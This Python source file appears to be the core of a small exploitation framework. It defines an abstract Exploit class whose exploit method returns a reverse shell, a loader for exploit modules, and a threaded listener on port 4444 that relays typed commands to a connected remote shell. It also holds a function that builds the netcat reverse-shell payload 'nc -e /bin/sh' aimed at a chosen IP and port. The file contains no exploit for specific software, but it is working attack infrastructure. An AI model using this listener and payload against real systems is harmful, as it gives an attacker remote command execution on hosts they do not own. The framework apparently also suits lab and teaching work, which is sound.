from abc import ABC, abstractmethod
from importlib import import_module
from os import listdir
import socket
import sys
import threading
from typing import Dict, List


class Exploit(ABC):
    """
    Abstract class that all exploit modules should implement.
    """

    def __init__(self, name, description):
        super().__init__()
        self.name = name
        self.description = description

    @abstractmethod
    def check(self, target, port):
        """
        Check if target is vulnerable to this exploit.
        :param target: target IP to check
        :param port: port to connect to
        :return: None
        """
        pass

    @abstractmethod
    def exploit(self, target, port, revshell_ip, revshell_port):
        """
        Perform the steps necessary to execute this exploit against the target.
        :param target: target IP
        :param port: port to connect to
        :param revshell_ip: IP to listen on for a reverse shell
        :param revshell_port: port to listen on for a reverse shell
        :return: reverse shell on success
        """
        pass

    def describe(self):
        """
        Describe the nature of this exploit.
        :return: None
        """
        print(self.description)

    @staticmethod
    def init_tcp_conn(target: str, port: int) -> socket.socket:
        """
        Generic method to create a TCP socket connection to a specified target on a specified port.
        :param target: target to connect to
        :param port: port to connect to on target
        :return: connected socket object
        """
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(5)
        try:
            conn.connect((target, port))
            return conn
        except socket.timeout as e:
            print(e)
            return None

    @staticmethod
    def get_banner(conn) -> str:
        """
        Get service banner from connection.
        :param conn: connected socket object
        :return: string containing the banner message
        """
        banner_data = conn.recv(1024)
        banner = banner_data.decode().strip()
        print('Banner: {}'.format(banner))
        return banner


class ExploitLoader:
    """
    Dynamically load exploit classes from modules in msf/exploits.
    """

    @staticmethod
    def list_files(directory) -> List:
        """
        Get a List of Python files hosted in the given directory.
        :param directory: directory to list files from
        :return: List of files
        """
        return sorted(f for f in listdir(directory) if f.endswith('.py') and '__init__.py' not in f)

    @staticmethod
    def load_exploits(directory='msf/exploits') -> Dict:
        """
        Import and initialize all exploit classes and return a List containing them.
        :param directory: directory to load exploit classes from
        :return: List of plugins
        """
        exploits = {}
        package = directory.replace('/', '.')
        filenames = ExploitLoader.list_files(directory)
        for f in filenames:
            # import module
            module_name = f.split('.')[0]
            module_path = '{}.{}'.format(package, module_name)
            module = import_module(module_path)
            # initialize class
            class_name = module_name.capitalize()
            my_class = getattr(module, class_name)
            my_instance = my_class()
            exploits[class_name] = my_instance
        return exploits


class Revshell(threading.Thread):
    """
    Reverse shell listener.
    """

    DEFAULT_REVSHELL_IP = '0.0.0.0'
    DEFAULT_REVSHELL_PORT = 4444

    def __init__(self, listen_host='0.0.0.0', listen_port=4444):
        """
        Initialize class.
        :param listen_host: IP address to listen on for incoming connections
        :param listen_port: port to listen on for incoming connections
        """
        super().__init__()
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.remote_socket = None
        self.remote_addr = None
        self.server = None

    def run(self):
        """
        Run thread.
        :return: None
        """
        # start listening
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.listen_host, self.listen_port))
        self.server.listen()
        # wait for inbound connections
        self.remote_socket, self.remote_addr = self.server.accept()
        print('Accepted connection from {}!'.format(self.remote_addr))

    def terminate(self):
        """
        Destroy the socket listener.
        :return: None
        """
        print('Terminating Revshell thread.')
        self.server.close()

    def close(self):
        """
        Close the connected socket.
        :return: None
        """
        print('Closing socket connected with {}.'.format(self.remote_addr))
        self.remote_socket.close()
        self.terminate()

    def interact(self):
        """
        Interact with connected socket.
        :return: None
        """
        print('Ready to interact on socket connected with {}.'.format(self.remote_addr))
        try:
            # get initial input from user
            print('Enter input or press CTRL-D for no input.')
            data = sys.stdin.readline()
            self.remote_socket.sendall(data.encode())
            while True:
                if data.startswith('exit'):
                    print('[*] Closing remote shell.')
                    self.close()
                    break
                # wait for response from target host
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.remote_socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                print(response)
                # get further input from user
                print('Enter further input or press CTRL-D for no input.')
                data = sys.stdin.readline()
                self.remote_socket.sendall(data.encode())
        except Exception as e:
            print(e)
            print('[*] Closing remote shell.')
            self.close()

    @staticmethod
    def build_generic_nc_payload(revshell_ip, revshell_port) -> str:
        """
        Build the generic netcat command to execute as the payload.
        :param revshell_ip: IP address to listen on
        :param revshell_port: port to listen on
        :return: string representing the payload to inject
        """
        return 'nc -e /bin/sh {} {}'.format(revshell_ip, revshell_port)
